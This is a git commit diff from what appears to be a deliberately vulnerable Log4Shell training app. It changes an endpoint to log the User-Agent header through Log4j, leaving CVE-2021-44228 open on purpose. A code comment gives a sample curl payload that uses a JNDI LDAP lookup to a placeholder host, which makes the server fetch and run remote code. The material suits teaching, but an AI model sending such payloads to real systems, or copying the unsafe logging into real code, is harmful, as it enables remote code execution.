d8717c598cb4208b0760a1ed1635d263cc5cfa7a
Luís Ventuzelos <luisventuzelos@gmail.com>
2023-04-15 23:11:35 +0100

    Log4j exploit working

--- src/main/java/com/example/madgoatlog4shell/Controller/GoatController.java
+++ src/main/java/com/example/madgoatlog4shell/Controller/GoatController.java
@@ -5,6 +5,7 @@ import com.example.madgoatlog4shell.Utils.Strings;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestHeader;
 import org.springframework.web.bind.annotation.RestController;
 
 @RestController
@@ -12,10 +13,15 @@ public class GoatController {
     private final static Logger logger = LogManager.getLogger(GoatController.class);
     private final GoatShell goatShell = new GoatShell("Goat Shell", Strings.GOAT_SHELL_DESCRIPTION);
 
-    @GetMapping("/goatShell/safe")
-    public GoatShell goat() {
+    @GetMapping("/goatShell/unsafe")
+    public GoatShell goat(@RequestHeader(value = "User-Agent") String userAgent) {
 
-        logger.info("Returning goat shell");
+        // This is a vulnerable endpoint that logs the user agent
+        // CVE-2021-44228 - Log4Shell
+        // Example exploit: curl -H 'User-Agent: ${jndi:ldap://DOMAIN_URL:LDAP_PORT/Basic/Command/Base64/dG91Y2ggL3RtcC9NYWRHb2F0V2FzSGVyZQ==}' DOMAIN_URL:PORT/goatShell/unsafe
+        // Exploit runs the command "touch /tmp/MadGoatWasHere" on the server
+        logger.info("Got request from user agent: {}", userAgent);
         return goatShell;
     }
+
 }
